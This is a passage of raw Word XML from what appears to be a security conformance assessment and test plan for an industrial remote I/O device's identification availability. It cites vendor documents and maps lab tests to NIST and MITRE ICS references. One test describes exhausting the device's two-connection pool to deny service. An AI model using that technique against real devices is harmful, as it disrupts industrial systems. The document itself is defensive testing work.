      <w:r w:rsidRPr="00E55DD7">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>G-1 (availability "at all times" — the core, design-not-attack).</w:t>
      </w:r>
      <w:r w:rsidRPr="00E55DD7">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> The info is </w:t>
      </w:r>
      <w:r w:rsidRPr="00E55DD7">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>not available at all times</w:t>
      </w:r>
      <w:r w:rsidRPr="00E55DD7">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> for </w:t>
      </w:r>
      <w:r w:rsidRPr="00E55DD7">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>five documented reasons</w:t>
      </w:r>
      <w:r w:rsidRPr="00E55DD7">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> — none of which is a malicious attack: </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0D43B8F2" w14:textId="77777777" w:rsidR="00015538" w:rsidRPr="00E55DD7" w:rsidRDefault="00015538">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="32"/>
        </w:numPr>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00E55DD7">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>(a) install reboot</w:t>
      </w:r>
      <w:r w:rsidRPr="00E55DD7">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> — /firmware/install "initiates a reboot to install" (SRIO-2953);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7A1AC0ED" w14:textId="77777777" w:rsidR="00015538" w:rsidRPr="00E55DD7" w:rsidRDefault="00015538">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="32"/>
        </w:numPr>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00E55DD7">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>(b) Init state</w:t>
      </w:r>
      <w:r w:rsidRPr="00E55DD7">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> at every power-on before IoT-Core is up (SRIO-1417);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6F6839F5" w14:textId="77777777" w:rsidR="00015538" w:rsidRPr="00E55DD7" w:rsidRDefault="00015538">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="32"/>
        </w:numPr>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00E55DD7">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>(c) SCPU-flash window</w:t>
      </w:r>
      <w:r w:rsidRPr="00E55DD7">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> — SCPU-sourced identifiers unavailable (SRIO-15759);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0C846192" w14:textId="77777777" w:rsidR="00015538" w:rsidRPr="00E55DD7" w:rsidRDefault="00015538">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="32"/>
        </w:numPr>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00E55DD7">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">(d) </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00E55DD7">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>FatalError</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00E55DD7">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> — safety parts held in safe state (SRIO-15757);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4D9FD15D" w14:textId="77777777" w:rsidR="00015538" w:rsidRPr="00015538" w:rsidRDefault="00015538">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="32"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="00E55DD7">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>(e) EMC disturbance</w:t>
      </w:r>
      <w:r w:rsidRPr="00E55DD7">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> — the manufacturer's </w:t>
      </w:r>
      <w:r w:rsidRPr="00E55DD7">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>own</w:t>
      </w:r>
      <w:r w:rsidRPr="00E55DD7">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> Criterion A/B concedes**"IoT-Core Communication: Not supervised … After the tests: IoT-Core access possible"** (SRIO-11573/11572). </w:t>
      </w:r>
      <w:r w:rsidRPr="00E55DD7">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>This is the killer citation</w:t>
      </w:r>
      <w:r w:rsidRPr="00E55DD7">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> — a documented admission that identification is </w:t>
      </w:r>
      <w:r w:rsidRPr="00E55DD7">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>not guaranteed during disturbance</w:t>
      </w:r>
      <w:r w:rsidRPr="00E55DD7">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">, directly contradicting "at all times." </w:t>
      </w:r>
      <w:hyperlink r:id="rId165" w:history="1">
        <w:r w:rsidRPr="00015538">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>[209_SRIO_C...</w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:r w:rsidRPr="00015538">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>e_RemoteIO</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r w:rsidRPr="00015538">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t xml:space="preserve"> | PDF]</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidRPr="00015538">
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:hyperlink r:id="rId166" w:history="1">
        <w:r w:rsidRPr="00015538">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>[100_SRIO_P...</w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:r w:rsidRPr="00015538">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>e_RemoteIO</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r w:rsidRPr="00015538">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t xml:space="preserve"> | PDF]</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="072FC6E3" w14:textId="77777777" w:rsidR="00015538" w:rsidRPr="00015538" w:rsidRDefault="00015538">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="32"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="00E55DD7">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>G-2 (2-connection self-DoS — accurate, keep — the one attack-adjacent vector).</w:t>
      </w:r>
      <w:r w:rsidRPr="00E55DD7">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> Two held/idle connections exhaust the pool (SRIO-7909) and </w:t>
      </w:r>
      <w:r w:rsidRPr="00E55DD7">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>block all further legitimate identification reads</w:t>
      </w:r>
      <w:r w:rsidRPr="00E55DD7">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">; incoming-only, no documented timeout. </w:t>
      </w:r>
      <w:r w:rsidRPr="00015538">
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI Emoji" w:hAnsi="Segoe UI Emoji" w:cs="Segoe UI Emoji"/>
        </w:rPr>
        <w:t>✅</w:t>
      </w:r>
      <w:r w:rsidRPr="00015538">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:hyperlink r:id="rId167" w:history="1">
        <w:r w:rsidRPr="00015538">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>[209_SRIO_C...</w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:r w:rsidRPr="00015538">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>e_RemoteIO</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r w:rsidRPr="00015538">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t xml:space="preserve"> | PDF]</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="4EEDADBC" w14:textId="77777777" w:rsidR="00015538" w:rsidRPr="00015538" w:rsidRDefault="00015538">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="32"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="00E55DD7">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>G-3 (no redundancy / QM single point of failure — keep, reliability-scoped).</w:t>
      </w:r>
      <w:r w:rsidRPr="00E55DD7">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> A COM fault or </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00E55DD7">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>SysCom</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00E55DD7">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> timeout removes identification availability entirely while the safety function persists → identification is </w:t>
      </w:r>
      <w:r w:rsidRPr="00E55DD7">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>structurally less available than the safety function it describes</w:t>
      </w:r>
      <w:r w:rsidRPr="00E55DD7">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
      <w:r w:rsidRPr="00E55DD7">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>(Reliability dependency; attack-induction of the fault → RQ-010.)</w:t>
      </w:r>
      <w:r w:rsidRPr="00E55DD7">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:hyperlink r:id="rId168" w:history="1">
        <w:r w:rsidRPr="00015538">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>[209_SRIO_C...</w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:r w:rsidRPr="00015538">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>e_RemoteIO</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r w:rsidRPr="00015538">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t xml:space="preserve"> | PDF]</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="0F2ED2C7" w14:textId="77777777" w:rsidR="00015538" w:rsidRPr="00015538" w:rsidRDefault="00015538">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="32"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="00E55DD7">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>G-4 (accessibility — partial credit, not a gap).</w:t>
      </w:r>
      <w:r w:rsidRPr="00E55DD7">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> The </w:t>
      </w:r>
      <w:r w:rsidRPr="00E55DD7">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Visualizer</w:t>
      </w:r>
      <w:r w:rsidRPr="00E55DD7">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> (SRIO-7914) satisfies "easily accessible form" — state this for a balanced verdict. </w:t>
      </w:r>
      <w:hyperlink r:id="rId169" w:history="1">
        <w:r w:rsidRPr="00015538">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>[209_SRIO_C...</w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:r w:rsidRPr="00015538">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>e_RemoteIO</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r w:rsidRPr="00015538">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t xml:space="preserve"> | PDF]</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="1258C8BB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b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>SL/conformance conclusion:</w:t>
      </w:r>
      <w:r w:rsidRPr="00E55DD7">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> The </w:t>
      </w:r>
      <w:r w:rsidRPr="00E55DD7">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>accessibility</w:t>
      </w:r>
      <w:r w:rsidRPr="00E55DD7">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> limb ("easily accessible form") is </w:t>
      </w:r>
      <w:r w:rsidRPr="00E55DD7">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>met</w:t>
      </w:r>
      <w:r w:rsidRPr="00E55DD7">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> via the Visualizer; the </w:t>
      </w:r>
      <w:r w:rsidRPr="00E55DD7">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>availability</w:t>
      </w:r>
      <w:r w:rsidRPr="00E55DD7">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> limb ("at all times") is </w:t>
      </w:r>
      <w:r w:rsidRPr="00E55DD7">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>not met</w:t>
      </w:r>
      <w:r w:rsidRPr="00E55DD7">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> — for </w:t>
      </w:r>
      <w:r w:rsidRPr="00E55DD7">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>five documented, non-malicious operational reasons</w:t>
      </w:r>
      <w:r w:rsidRPr="00E55DD7">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> (G-1, incl. the manufacturer's EMC "not-supervised" concession), compounded by a </w:t>
      </w:r>
      <w:r w:rsidRPr="00E55DD7">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>self-inflicted 2-connection DoS</w:t>
      </w:r>
      <w:r w:rsidRPr="00E55DD7">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> (G-2) and </w:t>
      </w:r>
      <w:r w:rsidRPr="00E55DD7">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>no redundancy on a QM component</w:t>
      </w:r>
      <w:r w:rsidRPr="00E55DD7">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> (G-3). Net: </w:t>
      </w:r>
      <w:r w:rsidRPr="00E55DD7">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>RQ-007 partially met; availability is the failing limb, and the failing is primarily a design/reliability limitation, not a third-party attack</w:t>
      </w:r>
      <w:r w:rsidRPr="00E55DD7">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> (generalized malicious DoS is assessed under RQ-010).</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="73195664" w14:textId="77777777" w:rsidR="00015538" w:rsidRPr="00015538" w:rsidRDefault="00015538" w:rsidP="00015538">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
      </w:pPr>
      <w:r w:rsidRPr="00015538">
        <w:pict w14:anchorId="596540FC">
          <v:rect id="_x0000_i1479" style="width:0;height:1.5pt" o:hralign="center" o:hrstd="t" o:hr="t" fillcolor="#a0a0a0" stroked="f"/>
        </w:pict>
      </w:r>
    </w:p>
    <w:p w14:paraId="2E143DD4" w14:textId="77777777" w:rsidR="00015538" w:rsidRPr="00E55DD7" w:rsidRDefault="00015538" w:rsidP="00015538">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00E55DD7">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>Step 2 — Methodological Test Planning (Scope-Corrected)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305"/>
        <w:gridCol w:w="1893"/>
        <w:gridCol w:w="1955"/>
        <w:gridCol w:w="618"/>
      </w:tblGrid>
      <w:tr w:rsidR="00015538" w:rsidRPr="00015538" w14:paraId="53FA89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94BF76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81FCB7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C8D312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proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00015538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56242B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 xml:space="preserve">Scientific </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00015538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B65C2A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SVV</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00015538" w:rsidRPr="00015538" w14:paraId="47A9B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F6B55" w14:textId="77777777" w:rsidR="00015538" w:rsidRPr="00015538" w:rsidRDefault="00015538" w:rsidP="00015538">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="00015538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57FFC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t>Retrieve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identification</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00015538">
              <w:t xml:space="preserve"> via IoT-Core + Visualizer in OPERATE; </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00015538">
              <w:t>confirm</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00015538">
              <w:t xml:space="preserve"> human-</w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00015538">
              <w:t>readable</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00015538">
              <w:t>, browser-</w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00015538">
              <w:t>accessible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BB3CD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Functional CR 7.8; confirms "easily accessible" limb (G-4 credit)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D7D5D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t>Requirements-based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verification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F33F9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SVV-1</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00015538" w:rsidRPr="00015538" w14:paraId="2948D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6DE88" w14:textId="77777777" w:rsidR="00015538" w:rsidRPr="00015538" w:rsidRDefault="00015538" w:rsidP="00015538">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="00015538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3DC61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Availability-across-states</w:t>
            </w:r>
            <w:r w:rsidRPr="00E55DD7">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve">: continuously poll the identification endpoint while driving Init (power-cycle), Update (999 + install reboot), and </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00E55DD7">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>FatalError</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00E55DD7">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>; log outage windows and the SCPU-flash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A27F7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Proves G-1</w:t>
            </w:r>
            <w:r w:rsidRPr="00E55DD7">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> (not available "at all times" — design, not attack)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C0773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NIST SP 800-115 §3.2 (availability/log review)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67CA6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SVV-2</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00015538" w:rsidRPr="00015538" w14:paraId="5C07EF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8C368" w14:textId="77777777" w:rsidR="00015538" w:rsidRPr="00015538" w:rsidRDefault="00015538" w:rsidP="00015538">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="00015538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D6D5C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Connection-hold self-DoS</w:t>
            </w:r>
            <w:r w:rsidRPr="00E55DD7">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>: open and hold 2 HTTP connections; attempt a 3rd legitimate identification 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93094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Proves G-2</w:t>
            </w:r>
            <w:r w:rsidRPr="00E55DD7">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> (self-inflicted DoS; CR 7.1 mechanism = CR 7.1 weakness)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93C2F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MITRE ATT&amp;CK for ICS </w:t>
            </w:r>
            <w:r w:rsidRPr="00E55DD7">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>T0814</w:t>
            </w:r>
            <w:r w:rsidRPr="00E55DD7">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> (self-inflicted variant); NIST SP 800-115 §5.2; </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00E55DD7">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>ifm</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00E55DD7">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="00E55DD7">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>CM-009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6CD89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SVV-4</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00015538" w:rsidRPr="00015538" w14:paraId="07090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22001" w14:textId="77777777" w:rsidR="00015538" w:rsidRPr="00015538" w:rsidRDefault="00015538" w:rsidP="00015538">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="00015538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298A3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Redundancy/reliability check</w:t>
            </w:r>
            <w:r w:rsidRPr="00E55DD7">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>: with a COM/</w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00E55DD7">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>SysCom</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00E55DD7">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> interruption present, confirm identification is unavailable while the safety function persists (availability inversion)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6699F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Proves G-3</w:t>
            </w:r>
            <w:r w:rsidRPr="00E55DD7">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> (no redundancy) — </w:t>
            </w:r>
            <w:r w:rsidRPr="00E55DD7">
              <w:rPr>
                <w:i/>
                <w:iCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>reliability</w:t>
            </w:r>
            <w:r w:rsidRPr="00E55DD7">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>, not attack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EF2BE" w14:textId="77777777" w:rsidR="00015538" w:rsidRPr="00015538" w:rsidRDefault="00015538" w:rsidP="00015538">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="00015538">
              <w:t>NIST SP 800-115 §3.2; OWASP ISTG-DES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35822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SVV-3</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00015538" w:rsidRPr="00015538" w14:paraId="74135E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2EF8B" w14:textId="77777777" w:rsidR="00015538" w:rsidRPr="00015538" w:rsidRDefault="00015538" w:rsidP="00015538">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:del w:id="24" w:author="Unknown">
              <w:r w:rsidRPr="00015538">
                <w:delText>TS — sustained load/flood; attack-induced COM DoS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C677B" w14:textId="77777777" w:rsidR="00015538" w:rsidRPr="00015538" w:rsidRDefault="00015538" w:rsidP="00015538">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="00015538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ADE89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→ RQ-010</w:t>
            </w:r>
            <w:r w:rsidRPr="00015538">
              <w:t xml:space="preserve"> (TC-RQ010-02/03/04)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7EEBB" w14:textId="77777777" w:rsidR="00015538" w:rsidRPr="00015538" w:rsidRDefault="00015538" w:rsidP="00015538">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="00015538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E6848" w14:textId="77777777" w:rsidR="00015538" w:rsidRPr="00015538" w:rsidRDefault="00015538" w:rsidP="00015538">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="00015538">
              <w:t>—</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="2628FE12" w14:textId="77777777" w:rsidR="00015538" w:rsidRPr="00015538" w:rsidRDefault="00015538" w:rsidP="00015538">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
      </w:pPr>
      <w:r w:rsidRPr="00E55DD7">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">Environment binding: all over the </w:t>
      </w:r>
      <w:r w:rsidRPr="00E55DD7">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>management path</w:t>
      </w:r>
      <w:r w:rsidRPr="00E55DD7">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> (Pi eth1 = 192.168.50.10 → IoT-Core; browser 192.168.50.20); the connection-hold tool runs on the </w:t>
      </w:r>
      <w:r w:rsidRPr="00E55DD7">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Pi</w:t>
      </w:r>
      <w:r w:rsidRPr="00E55DD7">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">, never the laptop. </w:t>
      </w:r>
      <w:hyperlink r:id="rId170" w:history="1">
        <w:r w:rsidRPr="00015538">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>[</w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
